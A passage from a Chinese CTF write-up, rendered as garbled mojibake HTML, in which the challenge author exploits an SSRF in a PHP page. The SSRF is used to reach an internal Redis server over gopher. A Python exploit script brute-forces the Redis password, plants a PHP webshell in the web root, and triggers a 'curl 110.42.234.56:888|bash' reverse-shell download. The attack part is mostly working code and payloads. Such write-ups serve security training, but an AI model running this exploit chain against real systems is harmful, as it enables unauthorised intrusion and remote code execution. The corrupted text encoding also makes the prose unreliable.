æ­¤æˆ‘ä»¬è¦è¯»å–çš„æºç æ–‡ä»¶å°±æ˜¯<code>/var/www/html/index.php</code>ã€‚</p><p>åˆ©ç”¨è¯¥æ–¹å¼è¯»å–æºç ï¼ˆ<code>?word=file: ///var/www/html/index.php&amp;submit=%E6%8F%90%E4%BA%A4</code>ï¼‰ï¼š</p><p><a href="/images/8b1c5c204800d886.png" class="gallery-item"><img src="/images/8b1c5c204800d886.png"></a></p><p>å¼¹å‡ºä¸¤ä¸ªindex.phpé¡µé¢ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç å³å¯å¾—åˆ°phpä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$word</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$curl_cmd</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="comment">//å±é™©ï¼å±é™©ï¼å±é™©ï¼</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl_cmd</span>, CURLOPT_URL, <span class="variable">$word</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl_cmd</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/%3fphp|\?php|%26|&amp;|%3f%70%68%70|?%70%68%70|ls/i&#x27;</span>,<span class="variable">$word</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;è¾“å…¥è¿™äº›æ˜¯æƒ³å¹²å•¥æï¼Ÿ-ã€‚-&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl_cmd</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl_cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">â€‹</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$word</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;word&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/dict|\.\.\/|https\:\/\/|_|127.0.0.1|0.0.0.0|localhost|file\:\//is&#x27;</span>, <span class="variable">$word</span>,<span class="variable">$match</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Brodyå’ŒChadè¿™å‘¨æœ«ä¼šä¸¾åŠä¸€ä¸ªè¶…æ£’çš„æ´¾å¯¹ï¼Œæ‰€æœ‰çš„å¤§é»‘å®¢éƒ½ä¼šå‡ºå¸­ï¼Œä½†ä½ çŒœè°æ”¶ä¸åˆ°é‚€è¯·ï¼Ÿä½ ï¼â†–ï¼ˆ^Ï‰^ï¼‰â†—&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl</span>(<span class="variable">$word</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å®¡è®¡ä»£ç ï¼Œå‘ç°æºç ä¸­ä½¿ç”¨äº†<code>curl_exec</code>å‡½æ•°ï¼Œå¹¶ä¸”å‡½æ•°ä¸­çš„å‚æ•°å¯æ§ï¼Œå› æ­¤å¯¼è‡´äº†ssrfã€‚æˆ‘ä»¬å¯ä»¥å‘ç°è¿™é‡Œè¿‡æ»¤äº†dictã€fileå’Œhttpsåè®®ï¼Œä½†æ˜¯httpåè®®è¿˜å¯ä»¥ä½¿ç”¨ï¼Œå¯ä»¥åˆ©ç”¨httpåè®®æ¥æ¢æµ‹å†…ç½‘å…¶ä»–ç½‘æ®µçš„ä¿¡æ¯ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ä¼ å…¥å‚æ•°<code>?word=http%3A%2F%2F172.26.0.3&amp;submit=%E6%8F%90%E4%BA%A4</code> å¹¶æŠ“åŒ…ï¼Œæ¢æµ‹å†…ç½‘å­˜æ´»ä¸»æœºï¼š</p><p><a href="/images/72614e159ef2c3bc.png" class="gallery-item"><img src="/images/72614e159ef2c3bc.png"></a></p><p>è§‚å¯Ÿç»“æœï¼Œæˆ‘ä»¬å‘ç°172.26.0.2çš„ä¸»æœºç»™å‡ºæˆ‘ä»¬æç¤ºï¼š</p><p><a href="/images/e5fbfa03ae923fdd.png" class="gallery-item"><img src="/images/e5fbfa03ae923fdd.png"></a></p><p>æ¥ç€æˆ‘ä»¬å¯¹172.26.0.2çš„ä¸»æœºè¿›è¡Œç«¯å£æ‰«æã€‚ä¸ºäº†èŠ‚çº¦æ—¶é—´ï¼Œé€šå¸¸æˆ‘ä»¬åªéœ€è¦å¯¹å¸¸ç”¨ç«¯å£è¿›è¡Œæ‰«æå³å¯ï¼Œå› æ­¤åˆ©ç”¨å¸¸ç”¨ç«¯å£å­—å…¸è¿›è¡Œçˆ†ç ´æ˜¯ä¸€ç§å¥½åŠæ³•ã€‚ä½†æ˜¯ç›´æ¥è¿›è¡Œä»0-65535çˆ†ç ´ä¹Ÿæ˜¯å¯ä»¥çš„(æ²¡æœ‰ä»€ä¹ˆä¸å¯ä»¥çš„ï¼Œåªæ˜¯éœ€è¦æ—¶é—´å¾ˆé•¿ç½¢äº†)ï¼Œæ–¹æ³•ä¸ä¸Šé¢ç±»ä¼¼ï¼š</p><p><a href="https://pic.imgdb.cn/item/626687a7b10bd.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626687a7b10bd.png"></a></p><p>é€šè¿‡æ‰«æç»“æœï¼Œæˆ‘ä»¬å‘ç°6379ç«¯å£å¤„äºå¼€æ”¾çŠ¶æ€ï¼Œè€Œ6379å±äº<code>redis</code> æ•°æ®åº“çš„ç«¯å£ï¼Œå¹¶ä¸”æ ¹æ®å›æ˜¾çš„ æŠ¥é”™ä¿¡æ¯ä¹Ÿèƒ½ç¡®è®¤â½¬æ ‡æœåŠ¡å™¨ä½¿â½¤äº†redisæ•°æ®åº“ï¼š</p><p><a href="https://pic.imgdb.cn/item/626687bf82c09.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626687bf82c09.png"></a></p><p>è¿™â¾¥æˆ‘ä»¬å¯ä»¥ä½¿â½¤ssrfé€šè¿‡redisè®¤è¯æ”»å‡»æ¥å¯¹æœåŠ¡å™¨è¿›è¡Œæ”»å‡»ï¼ˆ<a href="https://zhuanlan.zhihu.com/p/113396148">SSRFæ¼æ´æ”»å‡»Redisä»‹ç»</a>ï¼‰ã€‚</p><h3 id="åˆ©ç”¨gopheråè®®æ”»å‡»redisæ•°æ®åº“"><a href="#åˆ©ç”¨gopheråè®®æ”»å‡»redisæ•°æ®åº“" class="headerlink" title="åˆ©ç”¨gopheråè®®æ”»å‡»redisæ•°æ®åº“"></a>åˆ©ç”¨gopheråè®®æ”»å‡»redisæ•°æ®åº“</h3><p>ç”±äºdictåè®®è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥è¿™â¾¥æˆ‘ä»¬ä½¿â½¤ <code>gopher</code>åè®®ã€‚</p><p>gopheråè®®æ ¼å¼ï¼š</p><p><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_åæ¥TCPæ•°æ®æµ</code> ï¼ˆâ€™_â€˜å­—ç¬¦å¯ä»¥æ›´æ¢ä¸ºä»»æ„å­—ç¬¦ï¼Œä½†ä¸å¯çœç•¥ã€‚ï¼‰â€‹</p><ul><li><p>gopherçš„é»˜è®¤ç«¯å£æ˜¯70ï¼Œå¦‚æœå‘èµ·postè¯·æ±‚ï¼Œå›è½¦æ¢è¡Œéœ€è¦ä½¿ç”¨%0d%0aï¼Œå¦‚æœå¤šä¸ªå‚æ•°ï¼Œå‚æ•°ä¹‹é—´çš„&amp;ä¹Ÿéœ€è¦è¿›è¡ŒURLç¼–ç </p></li><li><p>å¦‚æœå‘èµ·postè¯·æ±‚ï¼Œå›è½¦æ¢è¡Œéœ€è¦ä½¿ç”¨%0d%0aï¼Œå¦‚æœå¤šä¸ªå‚æ•°ï¼Œå‚æ•°ä¹‹é—´çš„&amp;ä¹Ÿéœ€è¦è¿›è¡ŒURLç¼–ç </p></li></ul><p>åœ¨gopheråè®®ä¸­å‘é€HTTPçš„æ•°æ®ï¼Œéœ€è¦ä»¥ä¸‹ä¸‰æ­¥ï¼šâ€‹</p><ol><li><p>æ„é€ HTTPæ•°æ®åŒ…</p></li><li><p>URLç¼–ç ã€æ›¿æ¢å›è½¦æ¢è¡Œä¸º%0d%0a</p></li><li><p>å‘é€gopheråè®®</p></li></ol><h3 id="å†™è„šæœ¬å°†webshellå†™å…¥ä¸»æœºä¸­"><a href="#å†™è„šæœ¬å°†webshellå†™å…¥ä¸»æœºä¸­" class="headerlink" title="å†™è„šæœ¬å°†webshellå†™å…¥ä¸»æœºä¸­"></a>å†™è„šæœ¬å°†webshellå†™å…¥ä¸»æœºä¸­</h3><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€äº›ç®€å•çš„å‘½ä»¤æµ‹è¯•ä¸€ä¸‹redisæ˜¯å¦å·²ç»è®¤è¯è¿‡äº†ï¼Œæ¯”å¦‚è¿™æ ·ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set snert <span class="number">1</span></span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>é€šè¿‡gopheråè®®å’Œredisæ•°æ®åŒ…æ ¼å¼æ„é€ æ•°æ®æµåï¼Œå¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.26.0.2:6379/a%2A3%0D%0A%243%0D%0Aset%0D%0A%245%0D%0Asnert%0D%0A%241%0D%0A1%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A</span><br></pre></td></tr></table></figure><p>ä¼ å…¥åï¼Œå›æ˜¾å¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/6266a41d239250f7c5e52df2.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6266a41d239250f7c5e52df2.png"></a></p><p>æç¤ºå­˜åœ¨å¯†ç ã€‚</p><p>è¿™é‡Œç›´æ¥è´´ä¸Šæˆ‘å†™çš„expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://web.snert.cn:5000/index.php&#x27;</span></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;172.26.0.2&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">cmd</span>):</span><br><span class="line">    payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/a&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    shell = <span class="string">&quot;\n\n\n\n&lt;?=system(\&quot;curl 110.42.234.56:888|bash\&quot;);?&gt;\n\n\n\n&quot;</span><span class="comment">#å¼€å§‹å’Œç»“æŸçš„\nå¿…é¡»è¦æœ‰ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯å‰åå„æœ‰ä¸€ä¸ªï¼Œå½“ç„¶ï¼Œå¤šä¸ªä¹Ÿå¯ä»¥ï¼Œå¦‚æœæ˜¯å†™åœ¨crontabä¸­å¯ä»¥é¿å…crontabçš„è¯­æ³•é”™è¯¯ã€‚</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    cmd = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">        cmd = [<span class="string">&quot;auth &quot;</span>,</span><br><span class="line">               <span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">               <span class="string">&#x27;save&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;quit&#x27;</span></span><br><span class="line">               ]</span><br><span class="line">        cmd[<span class="number">0</span>] += <span class="built_in">str</span>(i)</span><br><span class="line">        payload = main(cmd)</span><br><span class="line">        params = &#123;<span class="string">&#x27;word&#x27;</span>:<span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(payload),<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(url,params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ERR invalid password&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;æ‰¾åˆ°å¯†ç ï¼Œå¯†ç ä¸ºï¼š&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    cmd.insert(<span class="number">2</span>,<span class="string">&quot;set snert &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)))</span><br><span class="line">    cmd.insert(<span class="number">3</span>,<span class="string">&quot;config set dir /var/www/html&quot;</span>)</span><br><span class="line">    cmd.insert(<span class="number">4</span>,<span class="string">&quot;config set dbfilename shell.php&quot;</span>)</span><br><span class="line">    payload = main(cmd)</span><br><span class="line">    params = &#123;<span class="string">&#x27;word&#x27;</span>: <span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(payload), <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">    req = requests.get(url, params)</span><br><span class="line"></span><br><span class="line">    fantan = <span class="built_in">input</span>(<span class="string">&#x27;å·²ç»å†™å…¥webshell,æ˜¯å¦å‡†å¤‡åå¼¹shell?è¾“å…¥yesæˆ–noï¼š&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> fantan == <span class="string">&#x27;yes&#x27;</span>:</span><br><span class="line">        params = &#123;<span class="string">&#x27;word&#x27;</span>:<span class="string">&#x27;http://172.26.0.2/shell.php&#x27;</span>,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">        req1 = requests.get(url,params)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è„šæœ¬å†™çš„æœ‰ç‚¹ä¹±ï¼Œæ‰€ä»¥æˆ‘è§£é‡Šä¸€ä¸‹ã€‚è¿™ä¸ªè„šæœ¬å¤§æ¦‚åˆ†ä¸ºäº†ä¸‰éƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†æ˜¯æ‰¾åˆ°redisçš„å¯†ç ï¼Œä¸€éƒ¨åˆ†æ˜¯ç»“åˆå¯†ç åˆ©ç”¨rediså­˜å…¥æˆ‘ä»¬æ„é€ å¥½çš„webshellè‡³ä¸»æœºä¸­ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†æ˜¯æ‰§è¡Œæ„é€ å¥½çš„webshellï¼Œåå¼¹shellåˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šã€‚</p><p>è¦ç†è§£è¿™ä¸ªè„šæœ¬ï¼Œé¦–å…ˆæˆ‘ä»¬è¦å…ˆçŸ¥é“æˆ‘ä»¬éœ€è¦redisæ‰§è¡Œå“ªäº›å‘½ä»¤ã€‚ç›´æ¥çœ‹è„šæœ¬æ˜¯æ€ä¹ˆå†™çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auth xxxx</span><br><span class="line">flushall</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡è¿™äº›å‘½ä»¤ç„¶åå°†iä»0è‡³9999éå†ä¸€éï¼Œçˆ†ç ´å‡ºredisçš„è®¤è¯å¯†ç ï¼Œå¯ä»¥å¾—åˆ°å¯†ç ä¸º9547ã€‚ï¼ˆé¢˜ç›®ä¹Ÿåœ¨é¶åœºç»™å‡ºhintï¼Œå¯†ç é•¿åº¦&lt;5ä¸”å‡ç”±æ•°å­—æ„æˆã€‚ï¼‰</p><p>å½“æˆ‘ä»¬å¾—åˆ°å¯†ç åå°±å¯ä»¥è®©redisæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auth 9547</span><br><span class="line">flushall</span><br><span class="line">set snert webshell</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè§£é‡Šä¸€ä¸‹è¿™äº›å‘½ä»¤ã€‚é¦–å…ˆæ˜¯authå‘½ä»¤ï¼Œå‘½ä»¤ç”¨äºæ£€æµ‹ç»™å®šçš„å¯†ç å’Œé…ç½®æ–‡ä»¶ä¸­çš„å¯†ç æ˜¯å¦ç›¸ç¬¦ï¼Œä¹Ÿå°±æ˜¯éªŒè¯æˆ‘ä»¬çš„å¯†ç æ˜¯å¦æ­£ç¡®ã€‚ç„¶åæ˜¯flushallï¼šæ¸…ç©ºæ•´ä¸ª Redis æœåŠ¡å™¨çš„æ•°æ®(åˆ é™¤æ‰€æœ‰æ•°æ®åº“çš„æ‰€æœ‰ key )ã€‚æ¥ç€æ·»åŠ åä¸ºsnertçš„keyï¼Œå€¼ä¸ºæˆ‘ä»¬æ‰€å®šä¹‰çš„webshellï¼Œä¹Ÿå°±æ˜¯<code>\n\n\n\n&lt;?=system(\&quot;curl 110.42.234.56:888|bash\&quot;);?&gt;\n\n\n\n</code>ï¼ˆè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œå› ä¸ºåœ¨æˆ‘ä»¬æ‹¿åˆ°çš„æºç ä¸­æˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼Œç³»ç»Ÿæ˜¯banæ‰äº†<code>?php</code>å­—ç¬¦ä¸²çš„ï¼Œæ‰€ä»¥ä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ã€‚å¹¶ä¸”æˆ‘ä»¬æ— æ³•é€šè¿‡å¸¸è§„æŸ¥çœ‹flagçš„æ‰‹æ®µæ¥getflagï¼Œå› ä¸ºå½“ä½ <code>cat /flag</code>ä¹‹åä½ å°±ä¼šå‘ç°ï¼Œè¿™è¯¥æ­»çš„å‡ºé¢˜äººä¹Ÿå°±æ˜¯æˆ‘ï¼ŒæŠŠçœŸæ­£çš„flagå†™åœ¨äº†ä¸€ä¸ªéšè—æ–‡ä»¶ä¸­ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦æ‹¿åˆ°æœåŠ¡å™¨çš„shellï¼‰ã€‚æ¥ç€è®¾ç½®å¤‡ä»½è·¯å¾„ä¸º&#x2F;var&#x2F;www&#x2F;htmlï¼Œç„¶åè®¾ç½®å¤‡ä»½æ–‡ä»¶åä¸ºshell.phpï¼Œå¼€å§‹å¤‡ä»½ï¼Œæœ€åé€€å‡ºã€‚</p><p>å…¶ä¸­redis_formatå‡½æ•°å°†ä¸Šé¢è¿™äº›å‘½ä»¤æ›´æ”¹ä¸ºRedisçš„æ•°æ®å‘é€çš„æ•°æ®åŒ…æ ¼å¼ï¼ˆå…·ä½“å®ç°å¯ä»¥çœ‹ä»£ç ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://172.26.0.2:6379/a*2</span><br><span class="line">$4</span><br><span class="line">auth</span><br><span class="line">$4</span><br><span class="line">9547</span><br><span class="line"></span><br><span class="line">*1</span><br><span class="line">$8</span><br><span class="line">flushall</span><br><span class="line"></span><br><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$5</span><br><span class="line">snert</span><br><span class="line">$51</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?=system(&quot;curl 110.42.234.56:888|bash&quot;);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$3</span><br><span class="line">dir</span><br><span class="line">$13</span><br><span class="line">/var/www/html</span><br><span class="line"></span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$10</span><br><span class="line">dbfilename</span><br><span class="line">$9</span><br><span class="line">shell.php</span><br><span class="line"></span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">quit</span><br><span class="line"></span><br><span class="line">//æ³¨æ„quitåé¢è¿˜æœ‰ä¸€ä¸ªæ¢è¡Œå“¦</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„curlåªæ˜¯å¯¹åº”index.phpä¸­çš„<code>curl_exec</code> å‡½æ•°ï¼Œä¸ºäº†ç†è§£å¾—æ›´ç›´è§‚æ‰è¿™æ ·å†™çš„ã€‚gopheråŠåé¢çš„æ•°æ®æ‰æ˜¯æˆ‘ä»¬éœ€è¦ä¼ å…¥çš„ã€‚ï¼ˆè¿™ç‚¹åº”è¯¥æ˜¯ä¸éœ€è¦è¯´çš„ï¼Œè‡ªå·±çœ‹æºç å°±å¯ä»¥çŸ¥é“ã€‚ï¼‰æ¥ç€å°†ä½¿ç”¨mainå‡½æ•°å…¶è½¬åŒ–ä¸ºurlç¼–ç ï¼Œåœ¨æ„é€ payloadçš„æ—¶å€™åº”è¯¥æ³¨æ„ï¼ŒTCPæ•°æ®æµå‰ä¸èƒ½å†ç”¨<code>_</code>è¿™ä¸ªå­—ç¬¦äº†ï¼Œå› ä¸ºè¢«ä»£ç è¿‡æ»¤äº†ï¼Œä½†æ˜¯è¿™ä¸ªå­—ç¬¦å¹¶ä¸æ˜¯å¿…é¡»ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»»ä½•ä¸€ä¸ªå­—ç¬¦ä»£æ›¿å®ƒï¼ˆè¯¦æƒ…è¯·çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://zhuanlan.zhihu.com/p/112055947">Gopheråè®®åœ¨SSRFæ¼æ´ä¸­çš„æ·±å…¥ç ”ç©¶</a>ï¼‰ã€‚æ¥ç€åˆ©ç”¨requestsæ¨¡å—ä¼ å…¥æ•°æ®ï¼š</p><p><a href="https://pic.imgdb.cn/item/626687db50948.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626687db50948.png"></a></p><p>æ¥ç€æ˜¯ç¬¬ä¸‰éƒ¨åˆ†ï¼Œåœ¨æ‰§è¡Œä¹‹å‰è„šæœ¬ä¼šè¯¢é—®ä½ æ˜¯å¦éœ€è¦åå¼¹shellï¼Œä½ åœ¨è¾“å…¥yesä¹‹å‰ï¼Œåº”è¯¥ç¡®ä¿è‡ªå·±å·²ç»ç›‘å¬èµ·äº†ç›¸åº”æœåŠ¡å™¨çš„ç›¸åº”ç«¯å£ã€‚æ¥ç€è„šæœ¬ä¼šç»§ç»­ä¼ å‚ï¼Œå…¶ä¸­wordå‚æ•°çš„å€¼ä¸º<code>http://172.26.0.2/shell.php</code>ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±æˆåŠŸåœ¨<code>172.26.0.3</code> ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„é¶æœº ä¸Šçš„index.phpåŒ…å«è¿›æ¥äº†ä¸€ä¸ª<code>172.26.0.2</code>æœºå™¨ä¸Šçš„shell.phpæ–‡ä»¶ï¼Œæ¥ç€shell.phpå°±ä¼šè¢«æ‰§è¡Œã€‚</p><p><a href="https://pic.imgdb.cn/item/626687ed9706b.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626687ed9706b.png"></a></p><p>è¿™é‡Œå†æ¬¡æé†’ä¸€ä¸‹ï¼Œå¦‚æœä½ 